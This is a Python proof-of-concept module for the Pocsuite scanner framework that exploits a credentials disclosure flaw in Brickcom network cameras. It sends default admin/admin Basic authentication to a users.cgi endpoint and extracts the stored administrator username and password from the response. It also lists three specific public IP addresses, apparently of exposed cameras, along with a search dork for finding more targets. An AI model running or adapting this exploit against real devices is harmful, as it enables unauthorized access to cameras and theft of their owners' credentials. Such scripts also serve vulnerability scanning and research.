#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import re
from base64 import encodestring




class TestPOC(POCBase):
    name = "Brickcom Corporation Network Cameras Credentials Disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'Credentials Disclosure'
    version = '1.0'    # default version: 1.0
    references = ['https://www.exploit-db.com/exploits/42588/ ']
    desc = '''Brickcom Corporation Network Cameras Sensitive information Disclosure'''

    vulDate = ''
    createDate = '2017-12-19'
    updateDate = '2017-12-19'
    dork = 'Brickcom'

    appName = 'Brickcom Camera'
    appVersion = 'WCB-040Af, WCB-100A, WCB-100Ae, OB-302Np, OB-300Af, OB-500Af'
    appPowerLink = ''
    samples = ['http://195.62.174.197:8080',
               'http://91.75.72.174:8181',
               'http://80.14.70.120:5000'
               ]

    def _attack(self):
        return self._verify(self)



    def _verify(self):
        '''verify mode'''
        result = {}
        if self.url.endswith('/'):
            self.url = self.url[:-1]

        vul_url = "/cgi-bin/users.cgi?action=getUsers"

        url = self.url + vul_url
        user = 'admin'
        passwd = 'admin'
        basestr = encodestring('%s:%s' % (user, passwd))[:-1]
        headers={'Authorization':'Basic %s' % basestr}

        resp = req.get(url,headers=headers)

        if resp and resp.status_code == 200:
            username = re.search("""User1.username=(.*?)[.\n]""", resp.content).group(1)
            password = re.search("""User1.password=(.*?)[.\n]""", resp.content).group(1)

            if username and password:
                result['AdminInfo'] = {}
                result['AdminInfo']['username'] = username
                result['AdminInfo']['password'] = password

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
